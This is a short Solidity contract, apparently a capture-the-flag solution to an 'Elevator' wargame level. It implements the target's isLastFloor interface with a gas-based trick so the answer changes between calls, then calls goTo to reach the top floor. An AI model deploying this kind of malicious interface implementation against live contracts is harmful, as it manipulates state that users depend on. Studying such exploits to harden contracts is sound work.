// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/console.sol";

contract ElevatorAttackAdvanced {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function isLastFloor(uint256 /*_floor*/) external view returns (bool) {
        return gasleft() < 8797746687696144422;
    }

    function attack() external {
        (bool success, ) = target.call(abi.encodeWithSignature("goTo(uint256)", 1));
        require(success, "call failed");
    }
}
